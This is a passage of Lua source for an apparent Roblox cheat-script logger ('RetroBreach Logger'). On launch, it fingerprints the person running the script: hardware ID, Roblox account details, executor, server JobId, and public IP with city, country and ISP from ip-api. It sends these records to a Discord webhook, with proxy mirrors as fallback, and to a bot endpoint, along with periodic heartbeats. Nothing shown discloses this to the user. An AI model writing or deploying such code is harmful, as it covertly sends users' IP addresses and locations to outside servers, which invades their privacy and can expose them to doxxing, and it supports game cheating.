-- ============================================================
-- JSON encoder (no decoder needed — /bancheck answers in plain text)
-- ============================================================
local function esc(s)
    s = tostring(s)
    s = s:gsub('[%c"\\]', function(c)
        if c == '"'  then return '\\"'
        elseif c == '\\' then return '\\\\'
        elseif c == '\n' then return '\\n'
        elseif c == '\r' then return '\\r'
        elseif c == '\t' then return '\\t' end
        return string.format('\\u%04X', string.byte(c))
    end)
    return '"' .. s .. '"'
end

local function isArray(t)
    local n = 0
    for k in pairs(t) do
        if type(k) ~= "number" then return false, 0 end
        n = n + 1
    end
    return true, n
end

local function encode(v)
    local t = type(v)
    if t == "string" then
        return esc(v)
    elseif t == "number" then
        if v ~= v or v == math.huge or v == -math.huge then return "null" end
        if v == math.floor(v) then return string.format("%d", v) end
        return tostring(v)
    elseif t == "boolean" then
        return v and "true" or "false"
    elseif t == "table" then
        local arr, n = isArray(v)
        if arr then
            local parts = {}
            for i = 1, n do parts[i] = encode(v[i]) end
            return "[" .. table.concat(parts, ",") .. "]"
        end
        local parts, i = {}, 0
        for k, val in pairs(v) do
            i = i + 1
            parts[i] = esc(tostring(k)) .. ":" .. encode(val)
        end
        return "{" .. table.concat(parts, ",") .. "}"
    end
    return "null"
end

-- last resort: Roblox's own HTTP. Yields, and Discord 403s the user-agent,
-- but it keeps the bot endpoint alive on executors with no request().
local warnedNoHttp = false
local function httpServiceCall(url, method, body)
    local ok, res = pcall(function()
        return HttpService:RequestAsync({
            Url     = url,
            Method  = method or "GET",
            Headers = {
                ["Content-Type"] = "application/json",
                ["x-rb-token"]   = Logger.TOKEN,
            },
            Body = body,
        })
    end)
    if not ok then return nil end
    if type(res) == "table" then
        return res.Body, res.StatusCode or res.Status or res.status
    end
    return res, nil
end

local function httpCall(url, method, body)
    if requestFn then
        -- closure form: some executors' static checker rejects pcall(fn, arg)
        -- with "argument count mismatch". Identical behaviour, no warning.
        local ok, res = pcall(function() return requestFn({
            Url     = url,
            Method  = method or "GET",
            Headers = {
                ["Content-Type"]  = "application/json",
                ["x-rb-token"]    = Logger.TOKEN,
                ["User-Agent"]    = "RetroBreach/1.0",
            },
            Body = body,
        }) end)
        if ok then
            if type(res) == "table" then
                return res.Body or res.body, res.StatusCode or res.Status or res.status
            end
            return res, nil
        end
        -- executor fn existed but threw -> still try the Roblox path once
        return httpServiceCall(url, method, body)
    end

    if not warnedNoHttp then
        warnedNoHttp = true
        warn("[RBLogger] no executor http function — falling back to HttpService.")
        warn("[RBLogger] Discord will 403 that path (Roblox user-agent). "
           .. "Bot endpoint still works.")
    end
    return httpServiceCall(url, method, body)
end

local function log(...)
    if Logger.Debug then print("[RBLogger]", ...) end
end

-- ============================================================
-- FINGERPRINT
-- ============================================================
local function getHWID()
    local hwid = nil

    -- Synapse style
    local gethwidFn = gget("gethwid")
    if type(gethwidFn) == "function" then
        local ok, r = pcall(function() return gethwidFn() end)
        if ok and r then
            if type(r) == "table" then
                local parts = {}
                for k, v in pairs(r) do parts[#parts + 1] = tostring(k) .. ":" .. tostring(v) end
                table.sort(parts)
                hwid = table.concat(parts, "|")
            else
                hwid = tostring(r)
            end
        end
    end

    -- Script-Ware / generic
    if not hwid or hwid == "" then
        local f = gget("get_hwid")
        if type(f) == "function" then
            local ok, r = pcall(function() return f() end)
            if ok and r then hwid = tostring(r) end
        end
    end
    if not hwid or hwid == "" then
        local f = gget("getHwid")
        if type(f) == "function" then
            local ok, r = pcall(function() return f() end)
            if ok and r then hwid = tostring(r) end
        end
    end

    -- Roblox's own client id — stable per machine, works everywhere
    if not hwid or hwid == "" then
        local ok, svc = pcall(function()
            return game:GetService("RbxAnalyticsService")
        end)
        if ok and svc then
            local ok2, id = pcall(function() return svc:GetClientId() end)
            if ok2 and type(id) == "string" and id ~= "" then
                hwid = "rbx:" .. id
            end
        end
    end

    if not hwid or hwid == "" then hwid = "unknown:" .. tostring(LocalPlayer.UserId) end
    return hwid
end

local function getExecutor()
    local ie = gget("identifyexecutor")
    if type(ie) == "function" then
        local ok, name, ver = pcall(function() return ie() end)
        if ok and name then
            return tostring(name), (ver and tostring(ver) or "?")
        end
    end
    local gen = gget("getexecutorname")
    if type(gen) == "function" then
        local ok, name = pcall(function() return gen() end)
        if ok and name then return tostring(name), "?" end
    end

    -- no identifyexecutor: sniff the namespaces that are actually present
    local marks = {
        { "syn", "Synapse X" }, { "fluxus", "Fluxus" }, { "Krnl", "KRNL" },
        { "krnl", "KRNL" }, { "PROTOSMASHER_LOADED", "Protosmasher" },
        { "Arceus", "Arceus" }, { "Sentinel", "Sentinel" },
        { "Electron", "Electron" }, { "Celestial", "Celestial" },
        { "Cryptic", "Cryptic" }, { "Valyse", "Valyse" },
    }
    for i = 1, #marks do
        if gget(marks[i][1]) ~= nil then return marks[i][2], "?" end
    end
    if not Logger.hasExecutorHttp then return "Unknown (no exec http)", "?" end
    return "Unknown", "?"
end

local function getGameName()
    local ok, info = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if ok and info and info.Name then return info.Name end
    return game.Name or "?"
end

local function getGeo()
    if not Logger.GeoLookup then return nil, nil end
    local body = httpCall("https://api.ipify.org/", "GET")
    local ip = body and body:match("^(%d+%.%d+%.%d+%.%d+)") or nil
    if not ip then return nil, nil end
    local geo = nil
    local b2 = httpCall("http://ip-api.com/json/" .. ip .. "?fields=status,country,countryCode,city,isp", "GET")
    if b2 then
        local country = b2:match('"country":"([^"]+)"')
        local city    = b2:match('"city":"([^"]+)"')
        local isp     = b2:match('"isp":"([^"]+)"')
        if country or isp then
            geo = (city and city .. ", " or "") .. (country or "?") .. (isp and ("  [" .. isp .. "]") or "")
        end
    end
    return ip, geo
end

local function isoTime(t)
    return os.date("!%Y-%m-%dT%H:%M:00Z", t or os.time())
end

local function shortHWID(h)
    if type(h) ~= "string" then return "?" end
    if #h <= 12 then return h end
    return h:sub(1, 8) .. ".." .. h:sub(-4)
end

-- ============================================================
-- DISCORD EMBED
-- ============================================================
local function field(name, value, inline)
    return { name = name, value = tostring(value):sub(1, 1024), inline = inline ~= false }
end

-- ============================================================
-- DELIVERY
--
-- Discord blocks Roblox's own HttpService user-agent (403). Executor-level
-- request() is not affected, so the direct URL is always tried first and
-- these mirrors are only a safety net for executors that route through
-- Roblox. Mirror operators see the payload AND your webhook URL — use a
-- throwaway webhook, or set Logger.ProxyFallback = false to disable.
-- ============================================================
local PROXY_HOSTS = {
    "https://discord.com",
    "https://hooks.hyra.io",
    "https://webhook.lewisakura.moe",
}

local function postEmbed(payload)
    local body, status = httpCall(Logger.URL, "POST", payload)

    -- only retry when the send actually failed; a nil status with a body
    -- means the executor just doesn't report one, so it is left alone
    local failed = (status ~= nil and (status == 0 or status >= 400))
                or (status == nil and body == nil)

    if failed and Logger.ProxyFallback then
        local path = tostring(Logger.URL):match("^https?://[^/]+(/.+)$")
        if path then
            for i = 2, #PROXY_HOSTS do
                body, status = httpCall(PROXY_HOSTS[i] .. path, "POST", payload)
                if status and status >= 200 and status < 300 then break end
            end
        end
    end

    log("post ->", tostring(status))
    return body, status
end

local function sendEmbed(fingerprint, title, color, extra)
    if not Logger.URL or Logger.URL == "" then return end

    local fields = {
        field("Account", ("%s (@%s)"):format(fingerprint.displayName, fingerprint.username), true),
        field("UserId",  fingerprint.userId, true),
        field("Account age", fingerprint.accountAge .. " days", true),
        field("Premium", fingerprint.premium and "Yes" or "No", true),
        field("HWID", "`" .. shortHWID(fingerprint.hwid) .. "`", true),
        field("Executor", fingerprint.executor .. " " .. fingerprint.executorVersion, true),
        field("Game", ("%s  (%d)"):format(fingerprint.gameName, fingerprint.placeId), true),
        field("JobId", "`" .. fingerprint.jobId .. "`", true),
        field("Players", fingerprint.playerCount .. " / " .. fingerprint.maxPlayers, true),
        field("Time (UTC)", fingerprint.timeStr, true),
    }

    if fingerprint.ip then
        fields[#fields + 1] = field("IP", "`" .. fingerprint.ip .. "`", true)
    end
    if fingerprint.geo then
        fields[#fields + 1] = field("Location", fingerprint.geo, false)
    end
    if extra then
        for i = 1, #extra do fields[#fields + 1] = extra[i] end
    end
    if not Logger.hasExecutorHttp then
        fields[#fields + 1] = field("HTTP", "HttpService fallback (no executor request fn)", false)
    end

    local payload = encode({
        username   = "RetroBreach Logger",
        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",
        embeds = { {
            title     = title,
            color     = color,
            fields    = fields,
            footer    = { text = "RetroBreach  ·  hwid " .. shortHWID(fingerprint.hwid) },
            timestamp = isoTime(),
        } },
    })

    postEmbed(payload)
end

-- ============================================================
-- BOT ENDPOINT
-- ============================================================
local function report(fingerprint, event)
    if not Logger.API or Logger.API == "" then return nil end
    local body = encode({
        event           = event,
        hwid            = fingerprint.hwid,
        userId          = fingerprint.userId,
        username        = fingerprint.username,
        displayName     = fingerprint.displayName,
        accountAge      = fingerprint.accountAge,
        premium         = fingerprint.premium,
        executor        = fingerprint.executor,
        executorVersion = fingerprint.executorVersion,
        gameName        = fingerprint.gameName,
        placeId         = fingerprint.placeId,
        jobId           = fingerprint.jobId,
        ip              = fingerprint.ip,
        geo             = fingerprint.geo,
        http            = requestName or "httpservice",
        ts              = os.time(),
    })
    return httpCall(Logger.API .. "/report", "POST", body)
end

-- ============================================================
-- INIT
-- ============================================================
function Logger:Init()
    local fp = {}
    fp.hwid            = getHWID()
    fp.executor, fp.executorVersion = getExecutor()
    fp.userId          = LocalPlayer.UserId
    fp.username        = LocalPlayer.Name
    fp.displayName     = LocalPlayer.DisplayName
    fp.accountAge      = LocalPlayer.AccountAge
    fp.premium         = (LocalPlayer.MembershipType == Enum.MembershipType.Premium)
    fp.placeId         = game.PlaceId
    fp.jobId           = game.JobId
    fp.playerCount     = #Players:GetPlayers()
    fp.maxPlayers      = Players.MaxPlayers
    fp.timeStr         = os.date("!%Y-%m-%d %H:%M:%S", os.time())
    fp.gameName        = getGameName()

    log("http function:", tostring(requestName or "HttpService fallback"))
    log("executor:", fp.executor, fp.executorVersion)

    -- geo costs two HTTP round trips, so it runs off the main path and
    -- patches the record with a second report
    task.spawn(function()
        local ip, geo = getGeo()
        if ip then
            fp.ip, fp.geo = ip, geo
            pcall(function() report(fp, "geo") end)
            if self.URL ~= "" then
                pcall(function()
                    sendEmbed(fp, "Script executed", 5763719, {
                        field("IP", "`" .. ip .. "`", true),
                        field("Location", geo or "?", false),
                    })
                end)
            end
        end
    end)

    pcall(function() report(fp, "launch") end)
    pcall(function() sendEmbed(fp, "Script executed", 5763719) end)

    if self.API ~= "" then
        task.spawn(function()
            while task.wait(self.Heartbeat) do
                pcall(function() report(fp, "heartbeat") end)
            end
        end)
    end

    if self.HeartbeatExit then
        game:BindToClose(function()
            pcall(function() report(fp, "exit") end)
        end)
        pcall(function()
            Players.PlayerRemoving:Connect(function(p)
                if p == LocalPlayer then pcall(function() report(fp, "exit") end) end
            end)
        end)
    end

    log("init done — hwid", shortHWID(fp.hwid), "executor", fp.executor)
    return self
end

Logger.encode   = encode
Logger.gget     = gget
Logger.getHWID  = getHWID
Logger.getExecutor = getExecutor

return Logger
